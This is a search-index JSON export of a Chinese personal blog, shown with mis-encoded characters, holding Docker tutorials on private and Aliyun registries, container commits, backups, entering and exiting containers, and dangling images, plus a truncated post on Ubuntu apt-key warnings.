[{"title":"Dockeré•œåƒæ¨é€åˆ°ç§æœ‰ä»“åº“","url":"/2023/08/09/DockerPushLocal/","content":"\nåœ¨å®é™…çš„ç”Ÿäº§æ¡ä»¶ä¸­ï¼Œå…¬å¸ä¼šç”¨åˆ°æ¶‰åŠå…¬å¸å†…éƒ¨çš„èµ„æ–™ï¼Œå¹¶ä¸å¸Œæœ›å°†å®¹å™¨æŒ‚åœ¨å…¬å…±çš„ä»“åº“ï¼Œé‚£å°±éœ€è¦ä¸€ä¸ªç§æœ‰çš„å®¹å™¨ä»“åº“æ¥å­˜æ”¾æ‰“åŒ…çš„é•œåƒï¼Œæœ¬èŠ‚è®°å½•å¦‚ä½•åˆ›å»ºæœ¬åœ°ç§æœ‰é•œåƒä»“åº“ï¼Œå¹¶ä¸Šä¼ ä¸‹è½½é•œåƒã€‚\n\n1. æ‹‰å–é•œåƒ\n\næ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n\n```bash\ndocker pull registry\n```\n\n<!-- more -->\n\n2. è¿è¡Œå®¹å™¨\n\nä¸‹è½½å®Œé•œåƒä¹‹ååŒæ ·éœ€è¦å…ˆæŠŠé•œåƒè¿è¡Œèµ·æ¥ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š\n\n```bash\ndocker run -d -p 5000:5000 -v /docker/registry/:/tmp/registry --privileged=true --name registry-1 registry\n```\n\n* -d å®ˆæŠ¤è¿›ç¨‹è¿è¡Œï¼ˆåå°è¿è¡Œï¼‰\n\n* -v æ•°æ®å·æ˜ å°„ï¼ŒæŠŠæœ¬åœ°çš„`/docker/registry/`æ˜ å°„ä¸ºå®¹å™¨çš„`/tmp/registry`ã€‚\n\n* --privileged=trueï¼Œcontainerå†…çš„rootæ‹¥æœ‰çœŸæ­£çš„rootæƒé™ã€‚å…·ä½“è§£é‡Šå‚è€ƒ[è¿™ç¯‡æ–‡ç« ](https://blog.csdn.net/wangxuelei036/article/details/107457712)ã€‚\n\n* --name æŒ‡å®šå®¹å™¨çš„åå­—ï¼Œä¸è®¾ç½®ä¼šç”±ç³»ç»Ÿéšæœºåˆ†é…ä¸€ä¸ªã€‚\n\n3. æµ‹è¯•ä»“åº“å¯ç”¨æ€§\n\nå½“å‰æˆ‘ç”µè„‘çš„IPä¸ºï¼š192.168.1.42ã€‚\n\n```bash\ncurl -XGET http://192.168.1.42:5000/v2/_catalog\n```\n\nä¸‹é¢çš„ä¾‹å­å¯ä»¥çœ‹åˆ°å½“å‰æœ¬åœ°ç§æœ‰ä»“åº“ä¸­å¹¶æ²¡æœ‰ä»»ä½•çš„é•œåƒï¼Œå‡ºç°`{\"repositories\":[]}`,è¡¨ç¤ºæœ¬åœ°ç§æœ‰ä»“åº“å¯ç”¨ã€‚\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[]}\n```\n\n4. ç”Ÿæˆé•œåƒ\n\næ›´æ–°ä¸€ä¸ªé•œåƒï¼Œå¹¶é‡æ–°commitç”Ÿæˆä¸€ä¸ªé•œåƒï¼Œå…·ä½“ç”Ÿæˆé•œåƒçš„æ–¹æ³•å¯ä»¥å‚è€ƒ[è¿™ç¯‡æ–‡ç« ](https://nustarain.gitee.io/2023/08/09/ContainerCommit/)\n\næ¯”å¦‚ï¼Œæˆ‘åˆ©ç”¨mynginx:1.0é‡æ–°ç”Ÿæˆäº†ç‰ˆæœ¬å·ä¸º1.1çš„mynginxé•œåƒï¼š\n\n```bash\nroot@knight:/# docker commit -m \"add net-tools package\" -a \"lxp\" nginx-1 mynginx:1.1\nsha256:f35ce030ad1119c6fe4a1398386048ad51471e80a672c55912b46f157d1554c2\nroot@knight:/# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED          SIZE\nmynginx          1.1       f35ce030ad11   11 seconds ago   198MB\nmynginx          1.0       ff65638c821e   5 hours ago      196MB\n```\n\n5. æ›´æ”¹é•œåƒåç§°\n\nä¸Šä¼ åˆ°æœ¬åœ°ç§æœ‰ä»“åº“éœ€è¦æ»¡è¶³ä¸€å®šçš„é•œåƒåç§°ä¸Šä¼ è§„èŒƒï¼Œéœ€è¦å¯¹mynginx:1.1è¿›è¡Œæ”¹åï¼š\n\nå½“å‰æˆ‘ç”µè„‘çš„IPä¸ºï¼š192.168.1.42ã€‚\n\n```bash\ndocker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1\n```\n\næ•ˆæœå¦‚ä¸‹ï¼š\n\n```bash\nroot@knight:/# docker tag mynginx:1.1 192.168.1.42:5000/mynginx:1.1 \nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED          SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.1       f35ce030ad11   13 minutes ago   198MB\nmynginx                     1.0       ff65638c821e   5 hours ago      196MB\n```\n\nå¯ä»¥çœ‹å‡ºï¼Œä¿®æ”¹tagä¹‹åï¼Œå¹¶ä¸æ˜¯å°†åŸæ¥çš„é•œåƒç›´æ¥æ›´åï¼Œè€Œæ˜¯å…‹éš†å‡ºä¸€ä¸ªæ›´åçš„é•œåƒã€‚\n\n6. ä¿®æ”¹é…ç½®æ–‡ä»¶\n\nåœ¨dockerä¸­é»˜è®¤ä¸æ”¯æŒhttpåè®®ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œä»¥æ”¯æŒhttpåè®®ã€‚\n\nä¾‹ï¼š\n\n```bash\nroot@knight:/# cat /etc/docker/daemon.json \n{\n  \"registry-mirrors\": [\"https://az7a5oso.mirror.aliyuncs.com\"],\n  \"insecure-registries\": [\"192.168.1.42:5000\"]\n}\n```\n\n* registry-mirrors æ˜¯åŠ é€Ÿç”¨çš„ã€‚\n\n* insecure-registries æ˜¯å¼€å¯httpåè®®çš„ã€‚\n\né…ç½®å®Œæˆåå¦‚æœä¸ç”Ÿæ•ˆï¼Œå°è¯•`systemctl daemon-reload`ã€‚\n\nå¦‚æœè¿˜æ˜¯ä¸è¡Œï¼Œå°è¯•`systemctl restart docker`ï¼Œå®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¾ˆå°‘ä¼šç›´æ¥é‡å¯dockerï¼Œå› ä¸ºé‡å¯åï¼Œæ‰€æœ‰çš„å®¹å™¨éƒ½ä¼šåœæ­¢ï¼Œæ‰€ä»¥è¿™æ¡å‘½ä»¤ä¸€å®šè¦æ”¾åœ¨æœ€åã€‚\n\nå¦‚æœé‡å¯äº†dockerï¼Œä¸è¦å¿˜è®°æ­¥éª¤2ï¼Œé‡æ–°è¿è¡Œå®¹å™¨ã€‚\n\n7. ä¸Šä¼ åˆ°ç§æœ‰ä»“åº“\n\n```bash\ndocker push 192.168.1.42:5000/mynginx:1.1 \n```\n\nä¾‹å­ï¼š\n\n```bash\nroot@knight:/# docker push 192.168.1.42:5000/mynginx:1.1 \nThe push refers to repository [192.168.1.42:5000/mynginx]\n0033c6e89448: Pushed \nd874fd2bc83b: Pushed \n32ce5f6a5106: Pushed \nf1db227348d0: Pushed \nb8d6e692a25e: Pushed \ne379e8aedd4d: Pushed \n2edcec3590a4: Pushed \n1.1: digest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4 size: 1782\n```\n\n8. éªŒè¯ä»“åº“é•œåƒ\n\n```bash\nroot@knight:/# curl -XGET http://192.168.1.42:5000/v2/_catalog\n{\"repositories\":[\"mynginx\"]}\n```\n\nå¯ä»¥çœ‹åˆ°ç°åœ¨ä»“åº“ä¸­å·²ç»å­˜åœ¨â€œmynginxâ€çš„é•œåƒäº†ã€‚\n\n9. PULLåˆ°æœ¬åœ°ä½¿ç”¨\n\n```\ndocker pull 192.168.1.42:5000/mynginx:1.1\n```\n\nä¾‹å­ï¼š\n\n```bash\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker rmi 192.168.1.42:5000/mynginx:1.1 \nUntagged: 192.168.1.42:5000/mynginx:1.1\nUntagged: 192.168.1.42:5000/mynginx@sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nroot@knight:/# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED             SIZE\nmynginx      1.1       f35ce030ad11   About an hour ago   198MB\nnginx        latest    605c77e624dd   19 months ago       141MB\nregistry     latest    b8604a3fe854   21 months ago       26.2MB\nroot@knight:/# docker pull 192.168.1.42:5000/mynginx:1.1\n1.1: Pulling from mynginx\nDigest: sha256:e8c89fef743b31184833c6e08d0415c3e5cdd38770dcb584b1ad6173c64df4a4\nStatus: Downloaded newer image for 192.168.1.42:5000/mynginx:1.1\n192.168.1.42:5000/mynginx:1.1\nroot@knight:/# docker images\nREPOSITORY                  TAG       IMAGE ID       CREATED             SIZE\n192.168.1.42:5000/mynginx   1.1       f35ce030ad11   About an hour ago   198MB\nmynginx                     1.1       f35ce030ad11   About an hour ago   198MB\nnginx                       latest    605c77e624dd   19 months ago       141MB\nregistry                    latest    b8604a3fe854   21 months ago       26.2MB\n```","tags":["Docker"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"Dockeré•œåƒæ¨é€åˆ°é˜¿é‡Œäº‘","url":"/2023/08/09/DockerPushAliyun/","content":"\nåœ¨è‡ªå·±æœ¬åœ°ç”Ÿäº§éœ€è¦çš„Dockeré•œåƒï¼Œåªç•™åœ¨æœ¬åœ°åªèƒ½ä¾›è‡ªå·±ä½¿ç”¨ï¼Œè€Œåœ¨å›¢é˜Ÿåä½œçš„è¿‡ç¨‹ä¸­ï¼Œæ›´å¤šçš„è¦å‘æŒ¥æ–‡ä»¶å…±äº«çš„ä¼˜åŠ¿ï¼Œé‚£ä¹ˆå°±éœ€è¦æŠŠDockeré•œåƒæ¨é€åˆ°è¿œç«¯ä»“åº“ï¼Œä½œä¸ºä¸€ä¸ªå…±äº«çš„èµ„æºã€‚Docker Hub ç¡®å®æ˜¯ä¸€ä¸ªä¸é”™çš„å·¥å…·ï¼Œä½†æ˜¯ä½œä¸ºå›½å†…ç”¨æˆ·æ¥è®²ï¼Œä¸æ˜¯å¾ˆå‹å¥½ï¼Œé‚£ä¹ˆåœ¨é˜¿é‡Œäº‘è¿…çŒ›å‘å±•çš„ä»Šå¤©ï¼Œä¹Ÿç»™æˆ‘ä»¬æä¾›äº†ä¸é”™çš„è§£å†³æ–¹æ¡ˆã€‚æ‰€ä»¥ï¼Œæœ€åå†³å®šæŠŠé˜¿é‡Œäº‘ä»“åº“ä½œä¸ºdockeré•œåƒçš„é€‰æ‹©ã€‚\n\n### æ“ä½œæ­¥éª¤\n\n1. éœ€è¦æ‹¥æœ‰ä¸€ä¸ªé˜¿é‡Œäº‘æ——ä¸‹çš„ä¸€ä¸ªè´¦å·ï¼Œæ”¯ä»˜å®ï¼Œæ·˜å®ç­‰ç­‰éƒ½å¯ä»¥ã€‚æµè§ˆå™¨æœç´¢`aliyun.com`ã€‚\n\n<!-- more -->\n\n2. ç™»å½•å®Œæˆåï¼Œè¿›å…¥å®¹å™¨é•œåƒæœåŠ¡ã€‚\n\n![ç™»å½•](./DockerPushAliyun/1.png)\n\n3. å®ä¾‹åˆ—è¡¨é€‰æ‹©ä¸ªäººç‰ˆï¼Œè¿›å…¥ååˆ›å»ºå‘½åç©ºé—´ã€‚\n\n![ç™»å½•](./DockerPushAliyun/2.png)\n\n4. ç„¶ååˆ›å»ºé•œåƒä»“åº“ã€‚\n\n![ç™»å½•](./DockerPushAliyun/3.png)\n\n5. åˆ›å»ºå®Œæˆåï¼Œç‚¹å‡»é•œåƒä»“åº“å³ä¾§çš„ç®¡ç†ã€‚\n\n![ç™»å½•](./DockerPushAliyun/4.png)\n\n6. è¿™é‡Œé¢æ˜¯å¯èƒ½ä¼šç”¨åˆ°çš„å‘½ä»¤ã€‚\n\n![ç™»å½•](./DockerPushAliyun/5.png)\n\n7. é™„ä¸Šè‡ªå·±çš„ä»“åº“ï¼Œçº¯ç²¹ä¸ºäº†æ–¹ä¾¿è‡ªå·±ã€‚\n\n* ç™»å½•é˜¿é‡Œäº‘Docker Registryï¼š\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n* ä»Registryä¸­æ‹‰å–é•œåƒ:\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[é•œåƒç‰ˆæœ¬å·]\n```\n\n* å°†é•œåƒæ¨é€åˆ°Registry:\n\n```bash\ndocker login --username=knight731 registry.cn-hangzhou.aliyuncs.com\n```\n\n```bash\ndocker tag [ImageId] registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[é•œåƒç‰ˆæœ¬å·]\n```\n \n```bash\ndocker push registry.cn-hangzhou.aliyuncs.com/knight731/nginx:[é•œåƒç‰ˆæœ¬å·]\n```","tags":["Docker"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"å°†æ›´æ”¹è¿‡çš„å®¹å™¨å¯¼å‡ºä¸ºé•œåƒ","url":"/2023/08/09/ContainerCommit/","content":"\næ‰§è¡Œå‘½ä»¤ï¼š\n\n```bash\ndocker commit -m \"add vim package\" -a \"liuxp\" å®¹å™¨ID å®¹å™¨å:ç‰ˆæœ¬å·\n```\n\n* -m æ·»åŠ æäº¤æè¿°ã€‚\n\n* -a æŒ‡æ˜æäº¤äººã€‚ ","tags":["Docker"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"å®¹å™¨ä¸­ä¸‹è½½è½¯ä»¶åŒ…","url":"/2023/08/09/ContainerDownloadSoft/","content":"\næ¯ä¸ªå®¹å™¨éƒ½ç›¸å½“äºä¸€å°å•ç‹¬linuxæœºå™¨ã€‚ä¹Ÿæ­£å› ä¸ºå®¹å™¨çš„è½»ä¾¿å‹ï¼Œéƒ¨ç½²å¥½å®¹å™¨åï¼Œéå¸¸å¤šçš„è½¯ä»¶éƒ½æ˜¯ä¸å­˜åœ¨çš„ï¼Œéœ€è¦è‡ªå·±æŒ‰éœ€ä¸‹è½½ã€‚\n\nä¸€èˆ¬çš„æ­¥éª¤æ˜¯ï¼š\n\n1. æ‰§è¡Œå‘½ä»¤ï¼š\n\n```bash\napt-get update\n```\n\n2. ç­‰å¾…è½¯ä»¶åŒ…ç¼“å­˜æ›´æ–°å®Œæ¯•ï¼Œæ‰§è¡Œä¸‹è½½å‘½ä»¤ï¼Œæ¯”å¦‚ï¼š\n\n```bash\napt install -y vim\n```","tags":["Docker"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"Dockeré‡è¦æ•°æ®å¤‡ä»½","url":"/2023/08/08/DockerBackup/","content":"\nç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå…ä¸äº†ä¼šå‡ºç°ä¸€äº›è¯¯æ“ä½œï¼Œå¯¼è‡´Dockerå¼€å‘é‡è¦æ–‡ä»¶æˆ–è€…æ•°æ®çš„ä¸¢å¤±ï¼Œé‚£ä¹ˆåšå¥½é‡è¦æ•°æ®çš„å¤‡ä»½æ˜¯å…ä¸äº†çš„ã€‚ä¸»è¦å°±æ˜¯é‡è¦çš„é…ç½®æ–‡ä»¶ï¼Œç”šè‡³å·²ç»ç”Ÿæˆçš„é‡è¦çš„å®¹å™¨ï¼Œåè€…æ›´ç®€å•ç²—æš´ã€‚\n\n### æ‹·è´å®¹å™¨çš„é…ç½®æ–‡ä»¶\n\n```bash\ndocker cp å®¹å™¨ID:/tmp/a.txt /home/admin\n```\n\nä¾‹å­ï¼š\n\n<!-- more -->\n\nå°†nginx-1å®¹å™¨çš„NGINXé…ç½®æ–‡ä»¶æ‹·è´åˆ°å½“å‰ç›®å½•ä¸‹\n\n```bash\nroot@knight:/docker/nginx# ls\nroot@knight:/docker/nginx# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              44 minutes ago   Up 25 minutes             nginx-1\nroot@knight:/docker/nginx# docker cp nginx-1:/etc/nginx/nginx.conf ./\nroot@knight:/docker/nginx# ls\nnginx.conf\nroot@knight:/docker/nginx# \n```\n\n### å®¹å™¨çš„å¯¼å…¥ä¸å¯¼å‡º\n\nå¯¼å‡ºå®¹å™¨ï¼ˆé»˜è®¤æ˜¯å¯¼å‡ºåˆ°å½“å‰ç›®å½•ä¸‹ï¼‰ï¼š\n\n```bash\ndocker export å®¹å™¨ID > xxx.tar\n```\n\nä¾‹å­ï¼š\n\n```bash\nroot@knight:/docker# ls\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1    \"/bin/bash\"              51 minutes ago   Up 31 minutes             nginx-1\nroot@knight:/docker# docker export nginx-1 > nginx-1.tar\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# \n```\n\nå¯¼å…¥å®¹å™¨ï¼š\n\n```bash\ncat xxx.tar | docker import - [ç”¨æˆ·å/]é•œåƒå:ç‰ˆæœ¬å·\n```\n\nä¾‹å­ï¼š\n\nå¯¼å…¥nginx-1.tarè¿™ä¸ªå®¹å™¨\n\n```bash\nroot@knight:/docker# ls\nnginx-1.tar\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED         SIZE\nroot@knight:/docker# cat nginx-1.tar | docker import - knight/nginx-1:0.1\nsha256:f82cc108516521700a6d74e03e26be639131a5d361c66b50f923ba00a1df8fe3\nroot@knight:/docker# docker images\nREPOSITORY       TAG       IMAGE ID       CREATED         SIZE\nknight/nginx-1   0.1       f82cc1085165   4 seconds ago   140MB\nroot@knight:/docker# \n```","tags":["Docker"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"ä¸¤ç§è¿›å…¥å’Œé€€å‡ºå®¹å™¨çš„æ–¹æ³•ä»¥åŠå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«","url":"/2023/08/08/ExitContainer/","content":"\n### è¿›å…¥å®¹å™¨çš„ä¸¤ç§æ–¹æ³•\n\nä¸¤ç§è¿›å…¥å®¹å™¨çš„æ–¹æ³•åˆ†åˆ«æ˜¯ä½¿ç”¨`exec`he`attach`ä¸¤ç§æ–¹æ³•ã€‚\n\nå…·ä½“å¦‚ä¸‹ï¼š\n\n* ä½¿ç”¨`exec`çš„æ–¹å¼\n\n```bash\ndocker exec -it nginx-1 /bin/bash\n```\n\n* ä½¿ç”¨`attach`çš„æ–¹å¼\n\n<!-- more -->\n\n```bash\ndocker attach nginx-1\n```\n\n### è¿›å…¥å®¹å™¨ä¸¤ç§æ–¹æ³•çš„åŒºåˆ«\n\nä»ä¸‹é¢çš„ä¾‹å­æ¥çœ‹è¿™ä¸¤ç§è¿›å…¥å®¹å™¨çš„åŒºåˆ«ï¼š\n\n```bash\nroot@knight:/docker# docker ps \nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   21 seconds ago   Up 20 seconds             nginx-1\nroot@knight:/docker# docker exec -it nginx-1 /bin/bash\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED         STATUS         PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   2 minutes ago   Up 2 minutes             nginx-1\nroot@knight:/docker# docker attach nginx-1\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\nroot@knight:/docker# \n```\n\nå¯ä»¥è§‚å¯Ÿåˆ°ä»¥ä¸‹å‡ ç‚¹åŒºåˆ«ï¼š\n\n1. è¿›å…¥å®¹å™¨çš„å‘½ä»¤æŒ‡å®šçš„å‚æ•°ä¸ä¸€æ ·ï¼Œexecæ›´å¤æ‚ä¸€ç‚¹ï¼Œéœ€è¦æŒ‡å®šä¸€äº›å‚æ•°ã€‚\n\n2. ä½¿ç”¨execè¿›å»çš„å®¹å™¨ï¼Œexité€€å‡ºä¹‹åï¼Œå®¹å™¨ä»ç„¶è¿è¡Œï¼Œä½†æ˜¯ä½¿ç”¨attachè¿›å…¥çš„å®¹å™¨ï¼Œexité€€å‡ºä¹‹åï¼Œå®¹å™¨ç›´æ¥åœæ­¢äº†ã€‚\n\nåŸå› å¦‚ä¸‹ï¼š\n\n1. execåœ¨è¿›å…¥å®¹å™¨æ—¶ï¼Œä¼šåœ¨å®¹å™¨é‡Œé¢å¤–æ‰“å¼€ä¸€ä¸ªbashï¼Œå½“é€€å‡ºæ—¶ï¼Œä¼šåœç”¨å½“å‰çš„è¿™ä¸ªbashï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®¹å™¨ä¸­è¿˜ä¼šæœ‰ä¹‹å‰çš„bashåœ¨è¿è¡Œï¼Œæœ‰bashå°±æœ‰è¿›ç¨‹ï¼Œæœ‰è¿›ç¨‹å°±ä¸ä¼šåœæ­¢å®¹å™¨ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆexecåœ¨è¿›å…¥å®¹å™¨æ—¶ï¼Œè¦æŒ‡å®šä¸€ä¸ªè§£é‡Šå™¨çš„åŸå› ã€‚\n\n2. ä½¿ç”¨attachè¿›å…¥å®¹å™¨æ—¶ï¼Œä¼šç›´æ¥è¿›å…¥å®¹å™¨å½“å‰å­˜åœ¨çš„bash(è§£é‡Šå™¨)ï¼Œè€Œä¸ä¼šæ‰“å¼€æ–°çš„è§£é‡Šå™¨ï¼Œè€Œåœ¨é€€å‡ºçš„æ—¶å€™ï¼Œåˆ™ä¼šå…³é—­å”¯ä¸€å­˜åœ¨çš„è§£é‡Šå™¨ï¼Œä¹Ÿå°±æ˜¯è¯´å®¹å™¨æ²¡æœ‰å­˜åœ¨çš„è¿›ç¨‹äº†ï¼Œå®¹å™¨å°±è®¤ä¸ºè‡ªå·±æ²¡æœ‰å­˜åœ¨çš„ä»·å€¼äº†ï¼Œå°±ä¼šè‡ªå·±åœæ­¢ã€‚\n\n### é€€å‡ºå®¹å™¨çš„ä¸¤ç§æ–¹æ³•\n\nç©å®¹å™¨æ¯”è¾ƒå°‘çš„å¯èƒ½åªçŸ¥é“é€€å‡ºå®¹å™¨çš„æ–¹æ³•åªæœ‰`exit`å‘½ä»¤ï¼Œä½†æ˜¯åœ¨å®¹å™¨é€€å‡ºçš„æ—¶å€™å…¶å®è¿˜æœ‰<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>æ–¹å¼é€€å‡ºã€‚\n\n### é€€å‡ºå®¹å™¨çš„ä¸¤ç§æ–¹æ³•çš„åŒºåˆ«\n\né€€å‡ºå®¹å™¨çš„åŒºåˆ«æœ‰ä¸€ä¸ªå‰ææ˜¯æ„å»ºè¿™ä¸ªå®¹å™¨çš„æ—¶å€™ï¼Œæ²¡æœ‰æŒ‡å®š-dé€‰é¡¹ã€‚å¦åˆ™è®¾ç½®åå°è¿è¡Œæ˜¯æ²¡æœ‰ä»»ä½•åŒºåˆ«çš„ã€‚\n\nä»ä¸‹é¢çš„ä¾‹å­æ¥çœ‹è¿™ä¸¤ç§é€€å‡ºå®¹å™¨çš„åŒºåˆ«ï¼š\n\n```bash\nroot@knight:/docker# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED             SIZE\nmynginx       0.1       babef9096509   About an hour ago   140MB\nnginx         latest    605c77e624dd   19 months ago       141MB\nhello-world   latest    feb5d9fea6a5   22 months ago       13.3kB\nroot@knight:/docker# docker run -it --name nginx-2 nginx:latest /bin/bash\nroot@634746a9bd08:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS         PORTS     NAMES\nroot@knight:/docker# docker run -it --name nginx-3 nginx:latest /bin/bash\nroot@29ce1f7749cb:/# root@knight:/docker# docker ps\nCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS         PORTS     NAMES\n29ce1f7749cb   nginx:latest   \"/docker-entrypoint.â€¦\"   9 seconds ago    Up 8 seconds   80/tcp    nginx-3\nroot@knight:/docker# \n```\n\nå¯ä»¥è§‚å¯Ÿåˆ°ï¼š\n\n1. åœ¨nginx-2è¿™ä¸ªå®¹å™¨ä¸­ï¼Œä½¿ç”¨exité€€å‡ºä¹‹åï¼ŒæŸ¥çœ‹è¿è¡Œçš„å®¹å™¨ï¼Œæ˜¯æŸ¥ä¸åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œé€€å‡ºæ„å‘³ç€åœæ­¢ã€‚\n\n2. åœ¨nginx-3è¿™ä¸ªå®¹å™¨ä¸­ï¼Œä½¿ç”¨<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>åœæ­¢ï¼Œåœæ­¢åæŸ¥çœ‹è¿è¡Œçš„å®¹å™¨ï¼Œå‘ç°nginx-3å®¹å™¨ä»åœ¨è¿è¡Œï¼Œå¾—å‡ºç»“è®ºä½¿ç”¨å¿«æ·é”®é€€å‡ºä¸ä¼šå¯¼è‡´å®¹å™¨åœæ­¢ã€‚","tags":["Docker"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"Dockerçš„è™šæ‚¬é•œåƒçš„æŸ¥çœ‹å’Œåˆ é™¤","url":"/2023/08/08/DanglingImage/","content":"\n### ä»€ä¹ˆæ˜¯è™šæ‚¬é•œåƒ\n\nè™šæ‚¬é•œåƒï¼ˆdangling imageï¼‰ä¸€è¨€ä»¥è”½ä¹‹ï¼šé•œåƒæ—¢æ²¡æœ‰ä»“åº“åï¼Œä¹Ÿæ²¡æœ‰æ ‡ç­¾ï¼Œå‡ä¸º\\<none>\n\n\\<none>Â  Â  Â  \\<none>Â  Â  Â 02385df0ef86Â  Â Â 3 days agoÂ  Â 123 MB\n\n<!-- more -->\n\n### æŸ¥çœ‹è™šæ‚¬é•œåƒ\n\n```bash\ndocker images -f dangling=true\n```\n\n### åˆ é™¤è™šæ‚¬é•œåƒ\n\n```bash\ndocker rmi $(docker images -q -f dangling=true)\n```","tags":["Docker"],"categories":["å­¦ä¹ è¿‡ç¨‹"]},{"title":"ä¿®å¤Ubuntuä¸­çš„â€œKey is stored in legacy trusted.gpg keyringâ€é—®é¢˜","url":"/2023/08/06/Remove-aptkey/","content":"\nåœ¨Ubuntuä¸‹è½½è½¯ä»¶æ—¶ï¼Œç»å¸¸ä¼šå®‰è£…ä¸€äº›å­˜å‚¨ç§˜é’¥ï¼Œæ—¶é—´ä¸€é•¿å°±ä¼šæœ‰ä¸€äº›è¿‡æœŸçš„ï¼Œä¸èƒ½ç”¨çš„ï¼Œç»å¸¸ä¼šåœ¨`apt udate`æ—¶è¿›è¡Œæ£€æµ‹ï¼Œå¡ç€å¾ˆé•¿æ—¶é—´ï¼Œæœ€åè¿›è¡Œè­¦å‘Šï¼Œéå¸¸æµªè´¹æ—¶é—´ï¼Œè€Œä¸”å¯¹äºå¼ºè¿«ç—‡æ‚£è€…æ¥è®²ï¼Œæç¤ºè­¦å‘Šå’Œæç¤ºæŠ¥é”™æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œå¿…é¡»è§£å†³ã€‚\n\n### è§£å†³åŠæ³•\n\n* æŠ¥é”™ä¿¡æ¯\n\n```\næœ‰ 44 ä¸ªè½¯ä»¶åŒ…å¯ä»¥å‡çº§ã€‚è¯·æ‰§è¡Œ â€˜apt list --upgradableâ€™ æ¥æŸ¥çœ‹å®ƒä»¬ã€‚\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: å¯†é’¥å­˜å‚¨åœ¨è¿‡æ—¶çš„ trusted.gpg å¯†é’¥ç¯ä¸­ï¼ˆ/etc/apt/trusted.gpgï¼‰ï¼Œè¯·å‚è§ apt-key(8) çš„ DEPRECATION ä¸€èŠ‚ä»¥äº†è§£è¯¦æƒ…ã€‚\nW: æ— æ³•ä¸‹è½½ https://typora.io/linux/./InRelease  Could not wait for server fd - select (11: èµ„æºæš‚æ—¶ä¸å¯ç”¨) [IP: 2a03:2880:f10d:183:face:b00c:0:25de 443]\nW: éƒ¨åˆ†ç´¢å¼•æ–‡ä»¶ä¸‹è½½å¤±è´¥ã€‚å¦‚æœå¿½ç•¥å®ƒä»¬ï¼Œé‚£å°†è½¬è€Œä½¿ç”¨æ—§çš„ç´¢å¼•æ–‡ä»¶ã€‚\n```\n<!-- more -->\n\nè¿™ä¸€å…±æœ‰ä¸¤ä¸ªè­¦å‘Šï¼Œç¬¬ä¸€ä¸ªæ˜¯æç¤ºæœ‰è¿‡æœŸçš„å­˜å‚¨ç§˜é’¥ï¼Œç¬¬äºŒä¸ªæ˜¯ç´¢å¼•æ–‡ä»¶ä¸‹è½½å¤±è´¥ã€‚\n\n* è§£å†³ç´¢å¼•æ–‡ä»¶ä¸‹è½½å¤±è´¥\n\næ³¨æ„ç´¢å¼•æ–‡ä»¶çš„å…³é”®å­—æœ‰`typora`ï¼Œè¿›å…¥å­˜å‚¨ç´¢å¼•æ–‡ä»¶çš„ç›®å½•`/etc/apt/sources.list.d/`ï¼ŒæŠŠç›¸å…³çš„æ–‡ä»¶ç›´æ¥åˆ é™¤å³å¯ã€‚\n\n```bash\nknight@knight:~/wechat$ cd 